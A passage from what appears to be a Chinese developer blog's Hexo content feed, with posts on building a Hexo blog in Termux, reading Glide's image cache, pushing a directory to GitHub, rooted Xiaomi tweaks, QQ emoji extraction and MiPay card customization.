子类对象的创建过程</h4><ul><li>在子类对象被创建并调用其构造方法时，要先调用其父类的构造方法</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android手机搭建hexo博客</title>
      <link href="/2019/bo-ke-da-jian/"/>
      <url>/2019/bo-ke-da-jian/</url>
      
        <content type="html"><![CDATA[<p>在安卓手机上利用github pages快速搭建一个hexo博客  </p><a id="more"></a>  <hr><ul><li>所需软件<br>Termux：<a href="https://f-droid.org/zh_Hans/packages/com.termux/" target="_blank" rel="noopener">F-Droid下载</a> | <a href="Termux.zip">直接下载</a><br>MT管理器：<a href="https://www.coolapk.com/apk/bin.mt.plus" target="_blank" rel="noopener">酷安下载</a><br>手机上MD编辑器推荐 MarkdownX：<a href="https://res.gddhy.net/apk/MarkdownX.apk" target="_blank" rel="noopener">直接下载</a>  </li><li>自备github帐号一个，没有的自行注册  </li></ul><hr><ul><li>配置git  </li></ul><p>在Termux生成git的ssh公钥并添加到github帐号，如果已添加过，可以跳过此步骤  </p><p>生成方式和在Linux/Win上的操作基本一致  </p><p>第一次安装Termux需要先安装git和ssh，执行以下命令  </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg <span class="keyword">install</span> git</span><br><span class="line">pkg <span class="keyword">install</span> openssh</span><br></pre></td></tr></table></figure><p>配置git  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"用户名"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"邮箱"</span></span><br></pre></td></tr></table></figure><p>生成ssh密匙  </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -<span class="built_in">t</span> rsa -C <span class="string">"邮箱"</span></span><br></pre></td></tr></table></figure><p>读取ssh  </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br></pre></td></tr></table></figure><p>也可以使用MT管理器打开 <code>/data/data/com.termux/files/home/.ssh/id_rsa.pub</code> 查看，复制密匙，添加到你github帐号中，网页github/设置/SSH and GPG keys/new SSH key，完整复制粘贴保存即可    </p><p>使用以下命令可以测试密匙  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> git<span class="variable">@github</span>.com</span><br></pre></td></tr></table></figure><hr><ul><li>安装博客  </li></ul><p>在github上创建一个 <code>用户名.github.io</code> 的仓库</p><p>安装nodejs和hexo  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkg <span class="keyword">install</span> nodejs-lts</span><br><span class="line">npm <span class="keyword">install</span> hexo-cli -g</span><br><span class="line">npm <span class="keyword">install</span> hexo <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>设置博客安装目录，没有root的话建议放到内置储存中，有root可以直接跳过，打开sdcard目录，Termux默认目录在 <code>/data/data/com.termux/files/home/</code>   </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">termux-setup-storage</span><br><span class="line"><span class="keyword">cd</span> <span class="string">/sdcard</span></span><br></pre></td></tr></table></figure><p>创建博客工作目录并打开  </p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> blog</span><br><span class="line"><span class="built_in">cd</span> blog</span><br></pre></td></tr></table></figure><p>安装博客并设置git  </p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">init</span></span><br><span class="line">git <span class="keyword">init</span></span><br><span class="line">git remote add origin <span class="symbol">git@</span>github.com:用户名/用户名.github.io.git</span><br></pre></td></tr></table></figure><p>使用MT管理器查看博客工作目录的 <code>_config.yml</code> 文件尾，编辑内容，格式如下 <code>注意&quot;:&quot;后有空格</code>   </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line"> <span class="attribute">type</span>: git</span><br><span class="line"> <span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:用户名/用户名.github.io.git</span><br><span class="line"> <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure><p>安装部署服务  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>部署到github，第一次部署需要输入yes确认  </p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">generate</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">deploy </span></span><br><span class="line"><span class="attr">或</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>之后可以使用以下命令快速提交、预览</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br><span class="line"></span><br><span class="line"><span class="attr">hexo</span> <span class="string">s -g</span></span><br><span class="line"><span class="attr">本地预览</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d -g</span></span><br><span class="line"><span class="attr">直接提交</span></span><br></pre></td></tr></table></figure><p>提交到github后可以等几分钟可以使用 <code>https://用户名.github.io</code> 访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Hexo </tag>
            
            <tag> Termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图床</title>
      <link href="/2019/img-bed/"/>
      <url>/2019/img-bed/</url>
      
        <content type="html"><![CDATA[<p> 简单推荐几个图床  </p><a id="more"></a>  <p>也可以直接在此处上传  </p> <form id="form1"> <div style="text-align:center; background: #66CCFF repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem); box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15); margin: 1px; padding: 1px; border-radius: 200px; font-size: 14px; color: #555555; font-size: 150%; " onclick="file.click ()" title="点击上传图片"> <p style="text-align: center;margin: 5px;padding: 5px;" id="stat"> 点击上传图片 </p> <input type="file" id="file" name="file" onchange="sc ();" style="display:none"> </div></form> <div id="img"></div> <div id="imgurl" class="imgurl"></div> <!-- 需要 jQuery 支持，如果你网站有的话，这个就不要加上了 --> <script src="https://ku.oioweb.cn/jQuery/3.4.1/jquery.min.js" type="text/javascript"></script> <!-- 一定不要保存在本地！！！接口如果失效 我可以随时更换接口 --> <script type="text/javascript" src="https://ku.oioweb.cn/js/sinaimg.js"></script>  <hr><p> <strong>推荐图床</strong><br><a href="https://img.menhood.wang/" target="_blank" rel="noopener">menhood图床</a> | <a href="https://imgchr.com/" target="_blank" rel="noopener">路过图床</a> | <a href="https://sm.ms/" target="_blank" rel="noopener">SM.MS</a>  </p><hr><blockquote><p>图片直接上传来自<a href="https://blog.oioweb.cn/index.php/archives/507.html" target="_blank" rel="noopener">教书先生的博客</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>获取glide在本地缓存的文件</title>
      <link href="/2019/huo-qu-glide-huan-cun/"/>
      <url>/2019/huo-qu-glide-huan-cun/</url>
      
        <content type="html"><![CDATA[<p>glide是安卓上非常方便的图片加载工具，通过url等方式加载的图片会在本地缓存一份文件，glide并没有提供直接获取本地缓存的方法，以下方法可以直接获取glide在本地缓存的文件  </p><a id="more"></a><ul><li>添加DataCacheKey到自己的项目中  </li></ul><pre><code class="java"><span class="comment">/**</span><span class="comment"> * A cache key for original source data + any requested signature.</span><span class="comment"> */</span><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataCacheKey</span> <span class="keyword">implements</span> <span class="title">Key</span>  </span>{    <span class="keyword">private</span> <span class="keyword">final</span> Key sourceKey;    <span class="keyword">private</span> <span class="keyword">final</span> Key signature;    <span class="function"><span class="keyword">public</span> <span class="title">DataCacheKey</span><span class="params">(Key sourceKey, Key signature)</span> </span>{        <span class="keyword">this</span>.sourceKey = sourceKey;        <span class="keyword">this</span>.signature = signature;    }    <span class="function"><span class="keyword">public</span> Key <span class="title">getSourceKey</span><span class="params">()</span> </span>{        <span class="keyword">return</span> sourceKey;    }    <span class="meta">@Override</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>{        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> DataCacheKey) {            DataCacheKey other = (DataCacheKey) o;            <span class="keyword">return</span> sourceKey.equals(other.sourceKey) &amp;&amp; signature.equals(other.signature);        }        <span class="keyword">return</span> <span class="keyword">false</span>;    }    <span class="meta">@Override</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>{        <span class="keyword">int</span> result = sourceKey.hashCode();        result = <span class="number">31</span> * result + signature.hashCode();        <span class="keyword">return</span> result;    }    <span class="meta">@Override</span>    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>{        <span class="keyword">return</span> <span class="string">"DataCacheKey{"</span>                + <span class="string">"sourceKey="</span> + sourceKey                + <span class="string">", signature="</span> + signature                + <span class="string">'}'</span>;    }    <span class="meta">@Override</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateDiskCacheKey</span><span class="params">(MessageDigest messageDigest)</span> </span>{        sourceKey.updateDiskCacheKey(messageDigest);        signature.updateDiskCacheKey(messageDigest);    }}</code></pre><ul><li>使用以下方法即可获得缓存文件  </li></ul><pre><code class="java"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title">getGlideCacheFile</span><span class="params">(Context context ,String id)</span> </span>{        DataCacheKey dataCacheKey = <span class="keyword">new</span> DataCacheKey(<span class="keyword">new</span> GlideUrl(id), EmptySignature.obtain());        SafeKeyGenerator safeKeyGenerator = <span class="keyword">new</span> SafeKeyGenerator();        String safeKey = safeKeyGenerator.getSafeKey(dataCacheKey);        <span class="keyword">try</span> {            <span class="keyword">int</span> cacheSize = <span class="number">100</span> * <span class="number">1000</span> * <span class="number">1000</span>;            DiskLruCache diskLruCache = DiskLruCache.open(<span class="keyword">new</span> File(context.getCacheDir(), DiskCache.Factory.DEFAULT_DISK_CACHE_DIR), <span class="number">1</span>, <span class="number">1</span>, cacheSize);            DiskLruCache.Value value = diskLruCache.get(safeKey);            <span class="keyword">if</span> (value != <span class="keyword">null</span>) {                <span class="keyword">return</span> value.getFile(<span class="number">0</span>);            }        } <span class="keyword">catch</span> (IOException e) {            e.printStackTrace();        }        <span class="keyword">return</span> <span class="keyword">null</span>;    }</code></pre><p>glide4.8可以使用此方法获取本地图片缓存（支持glide4.0+）</p><blockquote><p>来自<a href="https://blog.csdn.net/u013009899/article/details/78357303" target="_blank" rel="noopener">Mr_Fingerling</a> | <a href="https://github.com/HuangShengHuan/GlideCache" target="_blank" rel="noopener">github</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将已存在的目录上传到Github</title>
      <link href="/2019/shang-chuan-dao-git/"/>
      <url>/2019/shang-chuan-dao-git/</url>
      
        <content type="html"><![CDATA[<ul><li>进入项目所在目录，右键，点击Git Bash Here进入终端  <a id="more"></a>  </li><li>将目录初始化为一个 Git 项目  </li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>执行完后会在目录中创建一个 .git 隐藏文件夹  </p><ul><li>将所有文件放进新的本地git仓库  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure></li></ul><p>如果本地已经有.gitignore文件，会按照已有规则过滤不需要添加的文件。如果不想要添加所有文件，可以把符号换成具体的文件名  </p><ul><li>将添加的文件提交到仓库  </li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git</span> commit -m <span class="string">"Initial commit"</span></span><br></pre></td></tr></table></figure><ul><li>将本地仓库关联到远程仓库  </li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="built_in">add</span> origin http<span class="variable">s:</span>//github.<span class="keyword">com</span>/用户名/仓库</span><br></pre></td></tr></table></figure><p>若已配置ssh key 可以使用  </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="keyword">add</span><span class="bash"> origin git@github.com:用户名/仓库.git</span></span><br></pre></td></tr></table></figure><ul><li>运行以下命令查看结果：  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git remote -v</span></span><br></pre></td></tr></table></figure></li></ul><p>如果执行结果如下，则成功  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">origin https:<span class="regexp">//gi</span>thub.com<span class="regexp">/javacfox/</span>Blog_Back_Up (fetch)  </span><br><span class="line">origin https:<span class="regexp">//gi</span>thub.com<span class="regexp">/javacfox/</span>Blog_Back_Up (push)</span><br></pre></td></tr></table></figure><ul><li>提交代码之前先执行一下同步  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin <span class="literal">master</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>提交代码到 GitHub 仓库  </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">push</span> <span class="built_in">origin</span> master</span><br></pre></td></tr></table></figure></li><li><p>如果报错，可以执行如下命令,慎用  </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin <span class="keyword">master</span> <span class="title">--allow-unrelated-histories</span></span><br></pre></td></tr></table></figure></li></ul><p>后面加上 –allow-unrelated-histories，把两段不相干的 分支进行强行合并，因为是提交到一个空白仓库，所以可以强制执行，然后在执行git push origin master  </p><blockquote><p>转自<a href="https://javacfox.github.io/2019/05/19/%E5%B0%86%E4%B8%80%E4%B8%AA%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%B8%80%E4%B8%AA-GIT-%E9%A1%B9%E7%9B%AE%E5%B9%B6%E6%89%98%E7%AE%A1%E5%88%B0-GITHUB-%E4%BB%93%E5%BA%93/" target="_blank" rel="noopener">Lujianlong</a> 有修改</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小爱捷径</title>
      <link href="/2019/xiao-ai-jie-jing/"/>
      <url>/2019/xiao-ai-jie-jing/</url>
      
        <content type="html"><![CDATA[<p>程序可以快速打开小爱捷径（小米只在米9/米MIX3上提供）  </p><a id="more"></a>  <p>核心代码，用root权限执行</p><pre><code class="shell">am start -n com.miui.voiceassist/com.xiaomi.voiceassistant.AiSettings.AiShortcutActivity</code></pre><p>小爱同学com.xiaomi.voiceassistant.AiSettings.AiShortcutActivity活动未在AndroidManifest.xml注册外部打开方式，无法直接访问启动，只能以root方式直接掉用  </p><p>ps. 小爱同学v5.3.6起已开放其他机型小爱捷径</p><hr><p><a href="https://res.gddhy.net/app/release/app-release.apk?c=AiShortcut" target="_blank" rel="noopener">程序下载</a> | <a href="https://github.com/gddhy/AiShortcut" target="_blank" rel="noopener">源码</a></p><hr><p>程序支持在桌面/通知栏磁贴快速调用<br>新增支持在调用语音助手应用时调通，支持在MIUI上长按home键调用（小米全面屏手机时长按电源键调用）<br><img src="/img/preloader.gif" data-original="https://s2.ax1x.com/2019/10/04/urA5Lj.jpg" alt="语音助手"></p><p><a href="com.android.settings.jpg">若图床链接失效，点此查看</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MIUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ表情提取</title>
      <link href="/2019/qq-biao-qing-ti-qu/"/>
      <url>/2019/qq-biao-qing-ti-qu/</url>
      
        <content type="html"><![CDATA[<p>手机QQ的表情储存在 <code>/sdcard/tencent/MobileQQ/.emotionsm</code> 目录<br>使用<a href="https://www.coolapk.com/apk/bin.mt.plus" target="_blank" rel="noopener">MT管理器</a> 打开目录发现打不开表情文件，因为gif的文件头 <strong>47 49 46 38 39 61</strong> 被腾讯改成了 <strong>47 48 46 39 39 60</strong> ，只需要使用MT管理器自带的十六进制编辑器改回gif的文件头即可读取  </p><a id="more"></a><p>本文不多解释，详见<a href="https://www.coolapk.com/feed/6157224?shareKey=NmQwNTQwMjcwYTRiNWQ3NDk4ZDA~&shareUid=778415&shareFrom=com.coolapk.market_9.5" target="_blank" rel="noopener">从手机QQ for Android提取原创表情</a> | <a href="https://luotianyi.vc/391.html" target="_blank" rel="noopener">提取qq原创动画表情（附视频）</a>  </p><hr><p>提供一个java程序，可以直接提取QQ表情，效果<br><img src="/img/preloader.gif" data-original="https://s2.ax1x.com/2019/09/08/n81Guj.jpg" alt="image">  </p><p><a href="效果图.jpg">若图床链接失效，点此查看</a></p><p>下载程序后，使用<a href="https://www.coolapk.com/apk/com.aide.ui" target="_blank" rel="noopener">AIDE</a> 运行<br><a href="QQ表情提取_java.zip">程序下载</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MiPay卡面自定义</title>
      <link href="/2019/mipay-qia-mian-zi-ding-yi/"/>
      <url>/2019/mipay-qia-mian-zi-ding-yi/</url>
      
        <content type="html"><![CDATA[<p>卡面自定义 <code>需要root</code> ，请确认您的设备 <code>已root</code><br>提供三个修改卡面的方式</p><a id="more"></a><h5 id="1-root-文件管理器"><a href="#1-root-文件管理器" class="headerlink" title="1. root + 文件管理器"></a>1. root + 文件管理器</h5><p>参考 <a href="https://www.coolapk.com/feed/8962914?shareKey=ZWViNWJjOTBjMGRlNWQ3MjQ1NGU~&shareUid=778415&shareFrom=com.coolapk.market_9.5" target="_blank" rel="noopener">如何自定义小米公交卡卡面和分享我自己做的卡面 - 风锐の自由</a></p><h5 id="2-root-MiPay卡面工具"><a href="#2-root-MiPay卡面工具" class="headerlink" title="2. root + MiPay卡面工具"></a>2. root + MiPay卡面工具</h5><p>下载MiPay卡面工具可以直接使用<br> <a href="https://www.coolapk.com/apk/com.hy.mipaycard" target="_blank" rel="noopener">酷安下载</a> | <a href="https://github.com/gddhy/MiPayCard/blob/master/README.md" target="_blank" rel="noopener">使用帮助</a> 感谢@<a href="https://github.com/Skimige" target="_blank" rel="noopener">星野みなと</a>  </p><h5 id="3-使用Magisk模块修改"><a href="#3-使用Magisk模块修改" class="headerlink" title="3. 使用Magisk模块修改"></a>3. 使用Magisk模块修改</h5><p>参考 <a href="https://www.coolapk.com/feed/11862333?shareKey=ZDc2NzI1NDdlZTU0NWQ3MjQ1ODk~&shareUid=778415&shareFrom=com.coolapk.market_9.5" target="_blank" rel="noopener">一个能对MI Pay卡片简单进行替换的magisk模块 - た尐尐懶蟲う</a> | <a href="https://www.coolapk.com/feed/13764070?shareKey=ZDc3N2ZlMmMzZTU3NWQ3Y2EzNGY~&shareUid=778415&shareFrom=com.coolapk.market_9.5" target="_blank" rel="noopener">Mi pay替换模块2.0！</a> </p><hr><p>上述修改方式不同，效果相同，目的是修改mipay用glide加载图片留在本地的缓存文件<br> <code>/data/data/com.miui.tsmclient/cache/image_manager_disk_cache</code>   </p><hr><h5 id="屏蔽MiPay-logo"><a href="#屏蔽MiPay-logo" class="headerlink" title="屏蔽MiPay logo"></a>屏蔽MiPay logo</h5><p>提供两个屏蔽mipay logo的magisk模块，模块使用 <a href="http://www.coolapk.com/u/1425695" target="_blank" rel="noopener">toolazy</a> 提供的汉化模板制作  </p><ol><li><p>用于屏幕mipay界面mipay logo <a href="https://raw.githubusercontent.com/gddhy/MiPayCard/master/hide_mipay_logo.zip" target="_blank" rel="noopener">点击下载 hide_mipay_logo.zip</a> </p></li><li><p>用于屏蔽小米钱包银行卡界面mipay logo <a href="https://raw.githubusercontent.com/gddhy/MiPayCard/master/hide_miwallet_mipay.zip" target="_blank" rel="noopener">点击下载 hide_miwallet_mipay.zip</a>  </p><p>ps.小米钱包2.0已默认隐藏MiPay logo</p></li></ol><p>效果图<br><img src="/img/preloader.gif" data-original="%E6%95%88%E6%9E%9C%E5%9B%BE.jpg" alt="效果图"> </p><hr><h5 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h5><p>mipay卡面工具中已添加图片打开方式/文件分享方式，当打开图片/分享图片时可以快速设置卡面  </p><p>v1.1.1起允许其他应用调用快速设置卡面，传入完整文件路径即可拉起mipay卡面工具快速设置卡面<br>（AndroidQ启用了类似iOS的沙盒机制，该方法不再适用，可以参考<a href="https://developer.huawei.com/consumer/cn/doc/50127#h1-2-" target="_blank" rel="noopener">Google Q版本应用兼容性整改指导 - 华为</a> 将图片文件直接传入ShareActivity或OpenActivity快速设置卡面）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setCard</span><span class="params">(Context context,String filePath)</span></span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    bundle.putString(<span class="string">"PATH_KEY"</span>, filePath);</span><br><span class="line">    intent.setClassName(<span class="string">"com.hy.mipaycard"</span>,<span class="string">"com.hy.mipaycard.GetPath"</span>);</span><br><span class="line">    intent.putExtras(bundle);</span><br><span class="line">    context.startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul><li>程序开源<br>源码<a href="https://github.com/gddhy/MiPayCard" target="_blank" rel="noopener">点此查看</a>  </li><li>程序权限<br>储存权限：用于读取本地图片(Q及后续版本不再需要，不会动态申请)<br>网络权限：用于联网更新卡面信息、加载在线卡面  </li><li>欢迎加群交流<a href="https://jq.qq.com/?_wv=1027&k=5BBYtAH" target="_blank" rel="noopener">MI Pay卡片美化交流群</a><br><a target="_blank" href="https://jq.qq.com/?_wv=1027&k=5BBYtAH"><img border="0" src="/img/preloader.gif" data-original="//pub.idqqimg.com/wpa/images/group.png" alt="MI Pay卡片美化交流群" title="MI Pay卡片美化交流群"></a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> MIUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>功能测试</title>
      <link href="/2019/gong-neng-ce-shi/"/>
      <url>/2019/gong-neng-ce-shi/</url>
      
        <content type="html"><![CDATA[<p>功能测试，如题  </p><a id="more"></a><h4 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h4><script type="text/javascript" src="http://open.iciba.com/ds_open.php?id=53528&name=Jsjjs&auth=321902F1096880B2C440BF0E346FB6E8" charset="utf-8"></script>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://open.iciba.com/ds_open.php?id=53528&amp;name=Jsjjs&amp;auth=321902F1096880B2C440BF0E346FB6E8"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="天气"><a href="#天气" class="headerlink" title="天气"></a>天气</h4><iframe allowtransparency="true" frameborder="0" width="317" height="18" scrolling="no" src="http://tianqi.2345.com/plugin/widget/index.htm?s=3&z=1&t=1&v=0&d=1&bd=0&k=&f=&q=1&e=0&a=1&c=54511&w=317&h=18&align=center"></iframe>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">allowtransparency</span>=<span class="string">"true"</span> <span class="attr">frameborder</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"317"</span> <span class="attr">height</span>=<span class="string">"18"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">src</span>=<span class="string">"http://tianqi.2345.com/plugin/widget/index.htm?s=3&amp;z=1&amp;t=1&amp;v=0&amp;d=1&amp;bd=0&amp;k=&amp;f=&amp;q=1&amp;e=0&amp;a=1&amp;c=54511&amp;w=317&amp;h=18&amp;align=center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="网页强制跳转"><a href="#网页强制跳转" class="headerlink" title="网页强制跳转"></a>网页强制跳转</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"网页链接"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="哔哩哔哩视频"><a href="#哔哩哔哩视频" class="headerlink" title="哔哩哔哩视频"></a>哔哩哔哩视频</h4><p>初岚</p><iframe src="//player.bilibili.com/player.html?aid=14010886&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>飞得更高  </p><iframe src="//player.bilibili.com/player.html?aid=18603489&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>To B Continued  </p><iframe src="//player.bilibili.com/player.html?aid=56911215&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>洛水天依  </p><iframe src="//player.bilibili.com/player.html?aid=58811214&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>  <p>朝汐  </p><iframe src="//player.bilibili.com/player.html?aid=32647141&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"//player.bilibili.com/player.html?aid=av号&amp;high_quality=1"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">frameborder</span>=<span class="string">"no"</span> <span class="attr">framespacing</span>=<span class="string">"0"</span> <span class="attr">allowfullscreen</span>=<span class="string">"true"</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="直播视频测试"><a href="#直播视频测试" class="headerlink" title="直播视频测试"></a>直播视频测试</h4><p><video controls="controls"><source src="http://183.207.249.15/PLTV/3/224/3221225530/index.m3u8" type="video/mp4"></video></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://183.207.249.15/PLTV/3/224/3221225530/index.m3u8"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span 